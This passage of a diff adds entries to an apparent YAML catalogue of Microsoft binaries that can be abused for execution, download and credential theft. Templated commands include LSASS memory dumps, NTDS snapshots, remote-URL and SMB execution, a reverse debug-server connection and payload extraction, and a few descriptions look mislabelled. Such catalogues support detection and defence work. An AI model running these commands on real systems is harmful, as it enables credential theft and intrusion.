+  description: Setup Unattend Generic Command Processor used during Windows deployment.
+  commands:
+  - setupugc.exe specialize
+  - setupugc.exe auditUser
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\setupugc.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\setupugc.exe''}'
+  attack: []
+- binary: write.exe
+  description: Windows Write
+  commands:
+  - write.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\write.exe''}'
+  - '{''Path'': ''C:\\Windows\\System32\\write.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\write.exe''}'
+  attack: []
+- binary: wt.exe
+  description: Windows Terminal
+  commands:
+  - wt.exe {CMD}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_<version_packageid>\\wt.exe''}'
+  attack: []
+- binary: Advpack.dll
+  description: Utility for installing software and drivers with rundll32.exe
+  commands:
+  - rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
+  - rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
+  - rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
+  - rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
+  - rundll32 advpack.dll, RegisterOCX {CMD}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\advpack.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\advpack.dll''}'
+  attack: []
+- binary: Desk.cpl
+  description: Desktop Settings Control Panel
+  commands:
+  - rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
+  - rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\desk.cpl''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\desk.cpl''}'
+  attack: []
+- binary: Dfshim.dll
+  description: ClickOnce engine in Windows used by .NET
+  commands:
+  - rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe''}'
+  - '{''Path'': ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe''}'
+  attack: []
+- binary: Ieadvpack.dll
+  description: INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.
+  commands:
+  - rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,
+  - rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,
+  - rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}
+  - rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}
+  - rundll32 ieadvpack.dll, RegisterOCX {CMD}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\ieadvpack.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\ieadvpack.dll''}'
+  attack: []
+- binary: Ieframe.dll
+  description: Internet Browser DLL for translating HTML code.
+  commands:
+  - rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\ieframe.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\ieframe.dll''}'
+  attack: []
+- binary: Mshtml.dll
+  description: Microsoft HTML Viewer
+  commands:
+  - rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\mshtml.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\mshtml.dll''}'
+  attack: []
+- binary: Pcwutl.dll
+  description: Microsoft HTML Viewer
+  commands:
+  - rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\pcwutl.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\pcwutl.dll''}'
+  attack: []
+- binary: PhotoViewer.dll
+  description: Windows Photo Viewer
+  commands:
+  - rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Photo Viewer\\PhotoViewer.dll''}'
+  attack: []
+- binary: Scrobj.dll
+  description: Windows Script Component Runtime
+  commands:
+  - rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\scrobj.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\scrobj.dll''}'
+  attack: []
+- binary: Setupapi.dll
+  description: Windows Setup Application Programming Interface
+  commands:
+  - rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+  - rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\setupapi.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\setupapi.dll''}'
+  attack: []
+- binary: Shdocvw.dll
+  description: Shell Doc Object and Control Library.
+  commands:
+  - rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\shdocvw.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\shdocvw.dll''}'
+  attack: []
+- binary: Shell32.dll
+  description: Windows Shell Common Dll
+  commands:
+  - rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}
+  - rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}
+  - rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}
+  - rundll32.exe shell32.dll,#44 {PATH:.dll}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\shell32.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\shell32.dll''}'
+  attack: []
+- binary: Shimgvw.dll
+  description: Photo Gallery Viewer
+  commands:
+  - rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\shimgvw.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\shimgvw.dll''}'
+  attack: []
+- binary: Syssetup.dll
+  description: Windows NT System Setup
+  commands:
+  - rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+  - rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\syssetup.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\syssetup.dll''}'
+  attack: []
+- binary: Url.dll
+  description: Internet Shortcut Shell Extension DLL.
+  commands:
+  - rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}
+  - rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}
+  - rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+  - rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}
+  - rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+  - rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\url.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\url.dll''}'
+  attack: []
+- binary: Zipfldr.dll
+  description: Compressed Folder library
+  commands:
+  - rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}
+  - rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\zipfldr.dll''}'
+  - '{''Path'': ''c:\\windows\\syswow64\\zipfldr.dll''}'
+  attack: []
+- binary: Comsvcs.dll
+  description: COM+ Services
+  commands:
+  - rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\comsvcs.dll''}'
+  attack: []
+- binary: AccCheckConsole.exe
+  description: Verifies UI accessibility requirements
+  commands:
+  - AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
+  - AccCheckConsole.exe -window "Untitled - Notepad" {PATH_ABSOLUTE:.dll}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x86\\AccChecker\\AccCheckConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\x64\\AccChecker\\AccCheckConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm\\AccChecker\\AccCheckConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22000.0\\arm64\\AccChecker\\AccCheckConsole.exe''}'
+  attack: []
+- binary: adplus.exe
+  description: Debugging tool included with Windows Debugging Tools
+  commands:
+  - adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
+  - adplus.exe -c {PATH:.xml}
+  - adplus.exe -c {PATH:.xml}
+  - adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\adplus.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\adplus.exe''}'
+  attack: []
+- binary: AgentExecutor.exe
+  description: Intune Management Extension included on Intune Managed Devices
+  commands:
+  - AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
+  - AgentExecutor.exe -powershell "{PATH_ABSOLUTE:.ps1}" "{PATH_ABSOLUTE:.1.log}" "{PATH_ABSOLUTE:.2.log}" "{PATH_ABSOLUTE:.3.log}" 60000 "{PATH_ABSOLUTE:folder}" 0 1
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe''}'
+  attack: []
+- binary: AppLauncher.exe
+  description: User Experience Virtualization tool that launches applications under monitoring to capture and synchronize user settings.
+  commands:
+  - AppLauncher.exe {PATH_ABSOLUTE:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\Microsoft User Experience Virtualization\\Management\\AppLauncher.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Microsoft User Experience Virtualization\\Management\\AppLauncher.exe''}'
+  attack: []
+- binary: AppCert.exe
+  description: Windows App Certification Kit command-line tool.
+  commands:
+  - appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}
+  - appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\appcert.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\App Certification Kit\\appcert.exe''}'
+  attack: []
+- binary: Appvlp.exe
+  description: Application Virtualization Utility Included with Microsoft Office 2016
+  commands:
+  - AppVLP.exe {PATH_SMB:.bat}
+  - AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\root\\client\\appvlp.exe''}'
+  attack: []
+- binary: Bcp.exe
+  description: Microsoft SQL Server Bulk Copy Program utility for importing and exporting data between SQL Server instances and data files.
+  commands:
+  - bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\bcp.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\bcp.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\bcp.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\130\\Tools\\Binn\\bcp.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SQL Server\\Client SDK\\ODBC\\110\\Tools\\Binn\\bcp.exe''}'
+  attack: []
+- binary: Bginfo.exe
+  description: Background Information Utility included with SysInternals Suite
+  commands:
+  - bginfo.exe {PATH:.bgi} /popup /nolicprompt
+  - bginfo.exe {PATH:.bgi} /popup /nolicprompt
+  - \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+  - \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
+  - \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+  - \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Cdb.exe
+  description: Debugging tool included with Windows Debugging Tools.
+  commands:
+  - cdb.exe -cf {PATH:.wds} -o notepad.exe
+  - 'cdb.exe -pd -pn {process_name}
+
+    .shell {CMD}'
+  - cdb.exe -c {PATH:.txt} "{CMD}"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe''}'
+  attack: []
+- binary: coregen.exe
+  description: Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within "C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\" or another version of Silverlight. Coregen is signed by Micro
+  commands:
+  - coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+  - coregen.exe dummy_assembly_name
+  - coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe''}'
+  attack: []
+- binary: Createdump.exe
+  description: Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)
+  commands:
+  - createdump.exe -n -f {PATH:.dmp} {PID}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe''}'
+  attack: []
+- binary: csi.exe
+  description: Command line interface included with Visual Studio.
+  commands:
+  - csi.exe {PATH:.cs}
+  paths:
+  - '{''Path'': ''c:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\MSBuild\\15.0\\Bin\\Roslyn\\csi.exe''}'
+  - '{''Path'': ''c:\\Program Files (x86)\\Microsoft Web Tools\\Packages\\Microsoft.Net.Compilers.X.Y.Z\\tools\\csi.exe''}'
+  attack: []
+- binary: DbgSrv.exe
+  description: A process server included with Debugging Tools for Windows for remote user-mode debugging.
+  commands:
+  - dbgsrv.exe -t tcp:port=5005 -c {CMD}
+  - dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbgsrv.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\dbgsrv.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Debugging Tools for Windows (x64)\\dbgsrv.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Debugging Tools for Windows (x86)\\dbgsrv.exe''}'
+  attack: []
+- binary: DefaultPack.EXE
+  description: This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.
+  commands:
+  - DefaultPack.EXE /C:"{CMD}"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\DefaultPack\\DefaultPack.exe''}'
+  attack: []
+- binary: Devinit.exe
+  description: Visual Studio 2019 tool
+  commands:
+  - devinit.exe run -t msi-install -i {REMOTEURL:.msi}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe''}'
+  attack: []
+- binary: Devtoolslauncher.exe
+  description: Binary will execute specified binary. Part of VS/VScode installation.
+  commands:
+  - devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} "{CMD:args}" test
+  - devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} "{CMD:args}" test
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\devtoolslauncher.exe''}'
+  attack: []
+- binary: dnx.exe
+  description: .NET Execution environment file included with .NET.
+  commands:
+  - dnx.exe {PATH_ABSOLUTE:folder}
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Dotnet.exe
+  description: dotnet.exe comes with .NET Framework
+  commands:
+  - dotnet.exe {PATH:.dll}
+  - dotnet.exe {PATH:.dll}
+  - dotnet.exe fsi
+  - dotnet.exe msbuild {PATH:.csproj}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\dotnet\\dotnet.exe''}'
+  attack: []
+- binary: dsdbutil.exe
+  description: Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.
+  commands:
+  - dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
+  - dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
+  - dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
+  - dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
+  - dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\dsdbutil.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\dsdbutil.exe''}'
+  attack: []
+- binary: dtutil.exe
+  description: Microsoft command line utility used to manage SQL Server Integration Services packages.
+  commands:
+  - dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft SQL Server\\<version>\\DTS\\Binn\\dtutil.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SQL Server\\<version>\\DTS\\Binn\\dtutil.exe''}'
+  attack: []
+- binary: Dump64.exe
+  description: Memory dump tool that comes with Microsoft Visual Studio
+  commands:
+  - dump64.exe {PID} out.dmp
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Feedback\\dump64.exe''}'
+  attack: []
+- binary: DumpMinitool.exe
+  description: Dump tool part Visual Studio 2022
+  commands:
+  - DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe''}'
+  attack: []
+- binary: Dxcap.exe
+  description: DirectX diagnostics/debugger included with Visual Studio.
+  commands:
+  - Dxcap.exe -c {PATH_ABSOLUTE:.exe}
+  - dxcap.exe -usage
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\dxcap.exe''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\dxcap.exe''}'
+  attack: []
+- binary: ECMangen.exe
+  description: Command-line tool for managing certificates in Microsoft Exchange Server.
+  commands:
+  - ECMangen.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\ECMangen.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\x64\\ECMangen.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft\\Exchange Server\\<version>\\Bin\\ECMangen.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft\\Exchange Server\\Bin\\ECMangen.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft\\Exchange Server\\ClientAccess\\Bin\\ECMangen.exe''}'
+  - '{''Path'': ''C:\\ExchangeServer\\Bin\\ECMangen.exe''}'
+  attack: []
+- binary: Excel.exe
+  description: Microsoft Office binary
+  commands:
+  - Excel.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Excel.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\Excel.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\Excel.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Excel.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Excel.exe''}'
+  attack: []
+- binary: Fsi.exe
+  description: 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.
+  commands:
+  - fsi.exe {PATH:.fsscript}
+  - fsi.exe
+  paths:
+  - '{''Path'': ''C:\\Program Files\\dotnet\\sdk\\<version>\\FSharp\\fsi.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe''}'
+  attack: []
+- binary: FsiAnyCpu.exe
+  description: 32/64-bit FSharp (F#) Interpreter included with Visual Studio.
+  commands:
+  - fsianycpu.exe {PATH:.fsscript}
+  - fsianycpu.exe
+  paths:
+  - '{''Path'': ''c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe''}'
+  attack: []
+- binary: IntelliTrace.exe
+  description: Visual Studio command-line tool for collecting and managing diagnostic trace files.
+  commands:
+  - IntelliTrace.exe launch /cp:"collectionplan.xml" /f:"c:\users\public\log" "C:\Windows\System32\calc.exe"
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\IntelliTrace\\IntelliTrace.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\IntelliTrace\\IntelliTrace.exe''}'
+  attack: []
+- binary: Logger.exe
+  description: A logging configuration tool from the Windows Kits used to start and manage process logging.
+  commands:
+  - logger.exe RUN "{CMD}"
+  - logger.exe RUNW "{CMD}"
+  - logger.exe "{CMD}"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\logger.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\logger.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\Debuggers\\x86\\logger.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\Debuggers\\x64\\logger.exe''}'
+  attack: []
+- binary: Mftrace.exe
+  description: Trace log generation tool for Media Foundation Tools.
+  commands:
+  - Mftrace.exe {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x86\\mftrace.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.16299.0\\x64\\mftrace.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x86\\mftrace.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x64\\mftrace.exe''}'
+  attack: []
+- binary: Microsoft.NodejsTools.PressAnyKey.exe
+  description: Part of the NodeJS Visual Studio tools.
+  commands:
+  - Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\Extensions\\Microsoft\\NodeJsTools\\NodeJsTools\\Microsoft.NodejsTools.PressAnyKey.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\Extensions\\Microsoft\\NodeJsTools\\NodeJsTools\\Microsoft.NodejsTools.PressAnyKey.exe''}'
+  attack: []
+- binary: Mpiexec.exe
+  description: Command-line tool for running Message Passing Interface (MPI) applications.
+  commands:
+  - mpiexec.exe {CMD}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft MPI\\Bin\\mpiexec.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft MPI\\Bin\\mpiexec.exe''}'
+  attack: []
+- binary: MSAccess.exe
+  description: Microsoft Office component
+  commands:
+  - MSAccess.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSAccess.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSAccess.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSAccess.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\MSAccess.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSAccess.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSAccess.exe''}'
+  attack: []
+- binary: Mscopilot.exe
+  description: Microsoft Copilot app
+  commands:
+  - mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="{CMD} && taskkill /f /im mscopilot.exe &&"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\Copilot\\Application\\mscopilot.exe''}'
+  attack: []
+- binary: Mscopilot_proxy.exe
+  description: Microsoft Copilot proxy launcher
+  commands:
+  - mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft\\Copilot\\Application\\mscopilot_proxy.exe''}'
+  attack: []
+- binary: Msdeploy.exe
+  description: Microsoft tool used to deploy Web Applications.
+  commands:
+  - msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
+  - msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="{PATH_ABSOLUTE:.bat}"
+  - msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe''}'
+  - '{''Path'': ''C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe''}'
+  - '{''Path'': ''C:\\Program Files\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe''}'
